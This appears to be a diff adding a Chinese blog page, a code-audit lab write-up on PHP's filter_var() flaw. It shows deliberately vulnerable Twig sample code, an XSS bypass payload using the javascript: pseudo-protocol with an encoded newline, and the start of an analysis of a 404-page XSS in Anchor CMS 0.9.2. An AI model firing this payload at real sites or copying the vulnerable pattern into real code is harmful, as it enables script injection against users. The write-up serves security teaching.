@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>PHP-Audit-Labs-Day2 filter_var() 函数缺陷 | C0r1&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">c0r1&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">c0r1&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">PHP-Audit-Labs-Day2 filter_var() 函数缺陷</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">c0r1</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">November 4, 2019&nbsp;&nbsp;8:31:54</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h1><p><a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day2/files/README.md" target="_blank" rel="noopener">[&#x7EA2;&#x65E5;&#x5B89;&#x5168;]&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;Day2 - filter_var&#x51FD;&#x6570;&#x7F3A;&#x9677;</a> </p>
+<p>Day Day Up ~</p>
+<p>&#x8D34;&#x4E00;&#x4E2A; <a href="https://www.vulnspy.com/cn-ripstech-presents-php-security-calendar-2017/" target="_blank" rel="noopener">RIPS 2017 PHP &#x4EE3;&#x7801;&#x5B89;&#x5168;&#x5BA1;&#x8BA1;&#x6311;&#x6218;&#x5728;&#x7EBF;&#x6D4B;&#x8BD5;&#x73AF;&#x5883;</a>&#xFF0C;&#x65B9;&#x4FBF;&#x6D4B;&#x8BD5;</p>
+<h1 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h1><blockquote>
+<p><a href="http://php.net/manual/zh/function.filter-var.php" target="_blank" rel="noopener"><strong>filter_var</strong> </a>&#xFF1A; (PHP 5 &gt;= 5.2.0, PHP 7)</p>
+<p><strong>&#x529F;&#x80FD;</strong> &#xFF1A;&#x4F7F;&#x7528;&#x7279;&#x5B9A;&#x7684;&#x8FC7;&#x6EE4;&#x5668;&#x8FC7;&#x6EE4;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;</p>
+<p><strong>&#x5B9A;&#x4E49;</strong> &#xFF1A;<a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <strong>filter_var</strong> ( <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$variable</code> [, int <code>$filter</code> = FILTER_DEFAULT [, <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$options</code> ]] )</p>
+</blockquote>
+<p><strong>&#x7F3A;&#x9677;&#xFF1A;</strong>filter_var() &#x51FD;&#x6570;&#x8FC7;&#x6EE4;&#x4E0D;&#x4E25;&#xFF0C;&#x53EF;&#x88AB;&#x591A;&#x79CD;&#x65B9;&#x5F0F;&#x7ED5;&#x8FC7;</p>
+<p><strong>&#x5EFA;&#x8BAE;&#xFF1A;</strong>&#x9700;&#x8981;&#x4E25;&#x683C;&#x6821;&#x9A8C; URL &#x683C;&#x5F0F;&#x65F6;&#xFF0C;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#x6B63;&#x5219;&#x68C0;&#x6D4B;</p>
+<h1 id="Day-2-Twig"><a href="#Day-2-Twig" class="headerlink" title="Day 2 - Twig"></a>Day 2 - Twig</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// composer require &quot;twig/twig&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&apos;vendor/autoload.php&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>{</span><br><span class="line">  <span class="keyword">private</span> $twig;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>{</span><br><span class="line">    $indexTemplate = <span class="string">&apos;&lt;img &apos;</span> .</span><br><span class="line">      <span class="string">&apos;src=&quot;https://loremflickr.com/320/240&quot;&gt;&apos;</span> .</span><br><span class="line">      <span class="string">&apos;&lt;a href=&quot;{{link|escape}}&quot;&gt;Next slide &amp;raquo;&lt;/a&gt;&apos;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default twig setup, simulate loading</span></span><br><span class="line">    <span class="comment">// index.html file from disk</span></span><br><span class="line">    $loader = <span class="keyword">new</span> Twig\Loader\ArrayLoader([</span><br><span class="line">      <span class="string">&apos;index.html&apos;</span> =&gt; $indexTemplate</span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;twig = <span class="keyword">new</span> Twig\Environment($loader);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNexSlideUrl</span><span class="params">()</span> </span>{</span><br><span class="line">    $nextSlide = $_GET[<span class="string">&apos;nextSlide&apos;</span>];</span><br><span class="line">    <span class="keyword">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twig-&gt;render(</span><br><span class="line">      <span class="string">&apos;index.html&apos;</span>,</span><br><span class="line">      [<span class="string">&apos;link&apos;</span> =&gt; <span class="keyword">$this</span>-&gt;getNexSlideUrl()]</span><br><span class="line">    );</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Template())-&gt;render();</span><br></pre></td></tr></table></figure>
+
+<h2 id="&#x6F0F;&#x6D1E;&#x89E3;&#x6790;"><a href="#&#x6F0F;&#x6D1E;&#x89E3;&#x6790;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x89E3;&#x6790;"></a>&#x6F0F;&#x6D1E;&#x89E3;&#x6790;</h2><p> &#x8FD9;&#x4E00;&#x5173;&#x9898;&#x76EE;&#x5B9E;&#x9645;&#x4E0A;&#x7528;&#x7684;&#x662F; PHP &#x7684;&#x4E00;&#x4E2A;&#x6A21;&#x677F;&#x5F15;&#x64CE; <a href="https://twig.symfony.com/" target="_blank" rel="noopener">Twig</a> &#xFF0C;&#x672C;&#x9898;&#x8003;&#x5BDF; XSS (&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB;) &#x6F0F;&#x6D1E;&#x3002;&#x867D;&#x7136;&#x9898;&#x76EE;&#x4EE3;&#x7801;&#x5206;&#x522B;&#x7528;&#x4E86; <strong>escape</strong> &#x548C; <strong>filter_var</strong> &#x4E24;&#x4E2A;&#x8FC7;&#x6EE4;&#x65B9;&#x6CD5;&#xFF0C;&#x4F46;&#x662F;&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x88AB;&#x653B;&#x51FB;&#x8005;&#x7ED5;&#x8FC7;&#x3002;&#x5728;&#x4E0A;&#x56FE; <strong>&#x7B2C; 10 &#x884C;</strong> &#x4E2D;&#xFF0C;&#x7A0B;&#x5E8F;&#x4F7F;&#x7528; <a href="https://twig.symfony.com/" target="_blank" rel="noopener">Twig</a> &#x6A21;&#x677F;&#x5F15;&#x64CE;&#x5B9A;&#x4E49;&#x7684; <strong>escape</strong> &#x8FC7;&#x6EE4;&#x5668;&#x6765;&#x8FC7;&#x6EE4; link&#xFF0C;&#x800C;&#x5B9E;&#x9645;&#x4E0A;&#x8FD9;&#x91CC;&#x7684; <strong>escape</strong> &#x8FC7;&#x6EE4;&#x5668;&#xFF0C;&#x662F;&#x7528; PHP &#x5185;&#x7F6E;&#x51FD;&#x6570; <strong>htmlspecialchars</strong> &#x6765;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x70B9;&#x51FB; <a href="https://twig.symfony.com/doc/2.x/filters/escape.html" target="_blank" rel="noopener">&#x8FD9;&#x91CC;</a> &#x4E86;&#x89E3; <strong>escape</strong> &#x8FC7;&#x6EE4;&#x5668;&#xFF0C; <strong>htmlspecialchars</strong> &#x51FD;&#x6570;&#x5B9A;&#x4E49;&#x5982;&#x4E0B;&#xFF1A; </p>
+<blockquote>
+<p><a href="http://php.net/manual/zh/function.htmlspecialchars.php" target="_blank" rel="noopener"><strong>htmlspecialchars</strong> </a>&#xFF1A;(PHP 4, PHP 5, PHP 7)</p>
+<p><strong>&#x529F;&#x80FD;</strong> &#xFF1A;&#x5C06;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x8F6C;&#x6362;&#x4E3A; HTML &#x5B9E;&#x4F53;</p>
+<p><strong>&#x5B9A;&#x4E49;</strong> &#xFF1A;string <strong>htmlspecialchars</strong> ( string <code>$string</code> [, int <code>$flags</code> = ENT_COMPAT | ENT_HTML401 [, string<code>$encoding</code> = ini_get(&#x201C;default_charset&#x201D;) [, bool <code>$double_encode</code> = <strong>TRUE</strong> ]]] )</p>
+</blockquote>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; (&amp; &#x7B26;&#x53F7;)  ===============  &amp;amp;</span><br><span class="line">&quot; (&#x53CC;&#x5F15;&#x53F7;)  ===============  &amp;quot;</span><br><span class="line">&apos; (&#x5355;&#x5F15;&#x53F7;)  ===============  &amp;apos;</span><br><span class="line"><span class="tag">&lt; (&#x5C0F;&#x4E8E;&#x53F7;)  ===============  <span class="string">&amp;lt;</span></span></span><br><span class="line"><span class="tag">&gt;</span> (&#x5927;&#x4E8E;&#x53F7;)  ===============  &amp;gt;</span><br></pre></td></tr></table></figure>
+
+<p> <a href="https://medium.com/@fran_bl4kd43m0n/one-way-to-bypass-htmlentities-c96e69a6e12c" target="_blank" rel="noopener">One way to bypass htmlentities</a> &#x4E2D;&#x7ED9;&#x51FA;&#x4E86;&#x4E24;&#x79CD;&#x7ED5;&#x8FC7;&#x60C5;&#x666F;&#xFF1A;</p>
+<ul>
+<li><p>&#x8BE5;&#x51FD;&#x6570;&#x9ED8;&#x8BA4;&#x4E0D;&#x8F6C;&#x4E49;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x67D0;&#x4E9B;&#x60C5;&#x51B5;&#x4E0B;&#x53EF;&#x4EE5;&#x95ED;&#x5408;&#x5355;&#x5F15;&#x53F7;&#x7ED5;&#x8FC7;</p>
+<p><img src="/2019/11/04/PHP-Audit-Labs-Day2-filter-var-&#x51FD;&#x6570;&#x7F3A;&#x9677;/htmlspecialchars.png" alt="image-20191104151910526"></p>
+</li>
+<li><p>&#x8F93;&#x51FA;&#x70B9;&#x5728; a &#x6807;&#x7B7E;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5; <code>javascript:</code> &#x4F2A;&#x534F;&#x8BAE;&#x7ED5;&#x8FC7;</p>
+</li>
+</ul>
+<p>&#x7B2C;&#x4E8C;&#x5904;&#x8FC7;&#x6EE4;&#x5728; <strong>&#x7B2C; 22 &#x884C;</strong> &#xFF0C;&#x8FD9;&#x91CC;&#x7528;&#x4E86; <strong>filter_var</strong> &#x51FD;&#x6570;&#x6765;&#x8FC7;&#x6EE4; <strong>nextSlide</strong> &#x53D8;&#x91CF;&#xFF0C;&#x4E14;&#x7528;&#x4E86; <strong>FILTER_VALIDATE_URL</strong> &#x8FC7;&#x6EE4;&#x5668;&#x6765;&#x5224;&#x65AD;&#x662F;&#x5426;&#x662F;&#x4E00;&#x4E2A;&#x5408;&#x6CD5;&#x7684; URL&#x3002; &#x9488;&#x5BF9;&#x8FD9;&#x4E24;&#x5904;&#x7684;&#x8FC7;&#x6EE4;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x4F7F;&#x7528; <strong>javascript&#x4F2A;&#x534F;&#x8BAE;</strong> &#x6765;&#x7ED5;&#x8FC7;&#x3002;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x7406;&#x89E3;&#xFF0C;&#x8BF7;&#x770B;&#x4E0B;&#x9762;&#x7684; demo &#x4EE3;&#x7801;&#xFF1A; </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $url = filter_var($_GET[<span class="string">&apos;url&apos;</span>], FILTER_VALIDATE_URL);</span><br><span class="line">	var_dump($url);</span><br><span class="line">	$url = htmlspecialchars($url);</span><br><span class="line">	var_dump($url);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&apos;$url&apos;&gt;Next slide &gt;&gt;&lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x4F7F;&#x7528; Payload&#xFF1A;<code>?url=javascript://comment%250aalert(1)</code> </p>
+<p><img src="/2019/11/04/PHP-Audit-Labs-Day2-filter-var-&#x51FD;&#x6570;&#x7F3A;&#x9677;/demo.png" alt="image-20191104092550635"></p>
+<p> &#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x8FD9;&#x91CC;&#x7684; <strong>//</strong> &#x5728; JavaScript &#x4E2D;&#x8868;&#x793A;&#x5355;&#x884C;&#x6CE8;&#x91CA;&#xFF0C;&#x6240;&#x4EE5;&#x540E;&#x9762;&#x7684;&#x5185;&#x5BB9;&#x5747;&#x4E3A;&#x6CE8;&#x91CA;&#xFF0C;&#x90A3;&#x4E3A;&#x4EC0;&#x4E48;&#x4F1A;&#x6267;&#x884C; <strong>alert</strong> &#x51FD;&#x6570;&#x5462;&#xFF1F;&#x90A3;&#x662F;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x7528;&#x4E86;&#x5B57;&#x7B26; <strong>%0a</strong> &#xFF0C;&#x8BE5;&#x5B57;&#x7B26;&#x4E3A;&#x6362;&#x884C;&#x7B26;&#xFF0C;&#x6240;&#x4EE5; <strong>alert</strong> &#x8BED;&#x53E5;&#x4E0E;&#x6CE8;&#x91CA;&#x7B26; <strong>//</strong> &#x5C31;&#x4E0D;&#x5728;&#x540C;&#x4E00;&#x884C;&#xFF0C;&#x5C31;&#x80FD;&#x6267;&#x884C;&#x3002;&#x5F53;&#x7136;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x8981;&#x5BF9; <strong>%</strong> &#x767E;&#x5206;&#x53F7;&#x7F16;&#x7801;&#x6210; <strong>%25</strong> &#xFF0C;&#x56E0;&#x4E3A;&#x7A0B;&#x5E8F;&#x5C06;&#x6D4F;&#x89C8;&#x5668;&#x53D1;&#x6765;&#x7684; payload&#xFF1A;<code>javascript://comment&#xFF05;250aalert(1)</code> &#x5148;&#x89E3;&#x7801;&#x6210;&#xFF1A; <code>javascript://comment%0aalert(1)</code> &#x5B58;&#x50A8;&#x5728;&#x53D8;&#x91CF; <strong>$url</strong> &#x4E2D;&#xFF08;&#x4E0A;&#x56FE;&#x7B2C;&#x4E8C;&#x884C;&#x4EE3;&#x7801;&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x7528;&#x6237;&#x70B9;&#x51FB; a &#x6807;&#x7B7E;&#x94FE;&#x63A5;&#x5C31;&#x4F1A;&#x89E6;&#x53D1; <strong>alert</strong> &#x51FD;&#x6570;&#x3002; </p>
+<p>&#x5728;&#x524D;&#x8A00;&#x63D0;&#x5230;&#x7684;&#x5728;&#x7EBF;&#x73AF;&#x5883;&#x4E2D;&#x6D4B;&#x8BD5;&#xFF0C;Payload&#xFF1A;<code>nextSlide=javascript://comment%250aalert(1)</code></p>
+<p><img src="/2019/11/04/PHP-Audit-Labs-Day2-filter-var-&#x51FD;&#x6570;&#x7F3A;&#x9677;/cat.png" alt="image-20191104095220228"></p>
+<h1 id="&#x5B9E;&#x4F8B;&#x5206;&#x6790;"><a href="#&#x5B9E;&#x4F8B;&#x5206;&#x6790;" class="headerlink" title="&#x5B9E;&#x4F8B;&#x5206;&#x6790;"></a>&#x5B9E;&#x4F8B;&#x5206;&#x6790;</h1><p> <strong>Anchor 0.9.2</strong> &#x7248;&#x672C;&#x4E2D; &#xFF0C; &#x5F53;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x9875;&#x9762;&#x65F6;&#xFF0C;&#x7A0B;&#x5E8F;&#x4F1A;&#x8C03;&#x7528; 404 &#x6A21;&#x677F;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;&#x6A21;&#x677F;&#x4E2D;&#x5B58;&#x5728; XSS &#x6F0F;&#x6D1E;&#x3002;&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;&#x4E3A; <code>themes/default/404.php</code> &#x4E2D;&#x7684; <code>current_url()</code> &#x51FD;&#x6570;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 404.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> theme_include(<span class="string">&apos;header&apos;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">	&lt;section class=&quot;content wrap&quot;&gt;</span><br><span class="line">		&lt;h1&gt;Page not found&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">		&lt;p&gt;Unfortunately, the page &lt;code&gt;/<span class="meta">&lt;?php</span> <span class="keyword">echo</span> current_url(); <span class="meta">?&gt;</span></span><br><span class="line">		&lt;/code&gt; could not be found. Your best bet is either to <span class="keyword">try</span> the </span><br><span class="line">		&lt;a href=<span class="string">&quot;&lt;?php echo base_url(); ?&gt;&quot;</span>&gt;homepage&lt;/a&gt;</span><br><span class="line">		, <span class="keyword">try</span> &lt;a href=<span class="string">&quot;#search&quot;</span>&gt;searching&lt;/a&gt;</span><br><span class="line">		, <span class="keyword">or</span> go <span class="keyword">and</span> cry in a corner (although I don&#x2019;t recommend the latter).</span><br><span class="line">		&lt;/p&gt;</span><br><span class="line">	&lt;/section&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> theme_include(<span class="string">&apos;footer&apos;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x53EF;&#x5728; <code>anchor/functions/helpers.php</code> &#x6587;&#x4EF6;&#x4E2D;&#x770B;&#x5230; <strong>current_url</strong> &#x51FD;&#x6570;&#x662F;&#x7531; <strong>Uri</strong> &#x7C7B;&#x4E2D; <strong>current</strong> &#x65B9;&#x6CD5;&#x5B9E;&#x73B0;&#x7684;</p>
+<p><img src="/2019/11/04/PHP-Audit-Labs-Day2-filter-var-&#x51FD;&#x6570;&#x7F3A;&#x9677;/1.png" alt="image-20191105152537408"></p>
+<p>&#x5728; <code>system/uri.php</code> &#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x5230; <strong>current</strong> &#x65B9;&#x6CD5;&#x7684;&#x5177;&#x4F53;&#x4EE3;&#x7801;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">current</span><span class="params">()</span> </span>{</span><br><span class="line">	<span class="keyword">if</span>(is_null(<span class="keyword">static</span>::$current)) <span class="keyword">static</span>::$current = <span class="keyword">static</span>::detect();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">static</span>::$current;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x5728; <strong>current()</strong> &#x4E2D;&#x8C03;&#x7528;&#x4E86; <strong>static::detect()</strong> &#x65B9;&#x6CD5;&#xFF0C;&#x8BE5;&#x65B9;&#x6CD5;&#x7528;&#x4E8E;&#x4ECE; <code>$_SERVER</code> &#x6570;&#x7EC4;&#x4E2D;&#x83B7;&#x53D6;&#x952E;&#x540D;&#x4E3A; <code>&apos;REQUEST_URI&apos; | &apos;PATH_INFO&apos; | &apos;ORIG_PATH_INFO&apos;</code> &#x7684;&#x503C;&#xFF0C; &#x5982;&#x679C;&#x5B58;&#x5728;&#x5176;&#x4E2D;&#x7684;&#x67D0;&#x4E00;&#x4E2A;&#x952E;&#xFF0C;&#x5E76;&#x4E14;&#x7B26;&#x5408; <strong>filter_var($uri, <a href="https://www.php.net/manual/zh/filter.filters.sanitize.php" target="_blank" rel="noopener">FILTER_SANITIZE_URL</a>)</strong> &#x548C; <strong><a href="https://www.php.net/manual/zh/function.parse-url.php" target="_blank" rel="noopener">parse_url</a>($uri, PHP_URL_PATH)</strong> &#xFF0C;&#x5219;&#x76F4;&#x63A5;&#x5C06; <strong>$uri</strong> &#x4F20;&#x5165; <strong>static::format</strong> &#x65B9;&#x6CD5; &#xFF0C;<strong>static::detect()</strong> &#x6E90;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">detect</span><span class="params">()</span> </span>{</span><br><span class="line">	<span class="comment">// create a server object from global</span></span><br><span class="line">	$server = <span class="keyword">new</span> Server($_SERVER);</span><br><span class="line"></span><br><span class="line">	$try = <span class="keyword">array</span>(<span class="string">&apos;REQUEST_URI&apos;</span>, <span class="string">&apos;PATH_INFO&apos;</span>, <span class="string">&apos;ORIG_PATH_INFO&apos;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>($try <span class="keyword">as</span> $method) {</span><br><span class="line"></span><br><span class="line">		<span class="comment">// make sure the server var exists and is not empty</span></span><br><span class="line">		<span class="comment">// &#x63A5;&#x53D7;&#x8DEF;&#x5F84;(&#x548C;&#x53C2;&#x6570;)&#x4FE1;&#x606F;</span></span><br><span class="line">		<span class="keyword">if</span>($server-&gt;has($method) <span class="keyword">and</span> $uri = $server-&gt;get($method)) {</span><br><span class="line"></span><br><span class="line">			<span class="comment">// apply a string filter and make sure we still have somthing left</span></span><br><span class="line">			<span class="comment">// &#x9664;&#x53BB;&#x5B57;&#x6BCD;&#xFF0C;&#x6570;&#x5B57;&#x548C; $ -_&#x3002;+&#xFF01;*&apos;&#xFF08;&#xFF09;&#xFF0C;{} | \\ ^&#x301C;[]`&lt;&gt;&#xFF03;&#xFF05;&#x201C;; /&#xFF1F;&#xFF1A;@&#xFF06;= &#x4EE5;&#x5916;&#x7684;&#x6240;&#x6709;&#x5B57;&#x7B26;</span></span><br><span class="line">			<span class="keyword">if</span>($uri = filter_var($uri, FILTER_SANITIZE_URL)) {</span><br><span class="line"></span><br><span class="line">				<span class="comment">// make sure the uri is not malformed and return the pathname</span></span><br><span class="line">				<span class="comment">// &#x786E;&#x4FDD;uri&#x683C;&#x5F0F;&#x6B63;&#x786E;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x8DEF;&#x5F84;&#x540D;(&#x5254;&#x9664;&#x53C2;&#x6570;&#x4FE1;&#x606F;)</span></span><br><span class="line">				<span class="keyword">if</span>($uri = parse_url($uri, PHP_URL_PATH)) {</span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">static</span>::format($uri, $server);</span><br><span class="line">				}</span><br><span class="line"></span><br><span class="line">				<span class="comment">// woah jackie, we found a bad&apos;n</span></span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> ErrorException(<span class="string">&apos;Malformed URI&apos;</span>);</span><br><span class="line">			}</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> OverflowException(<span class="string">&apos;Uri was not detected. Make sure the REQUEST_URI is set.&apos;</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
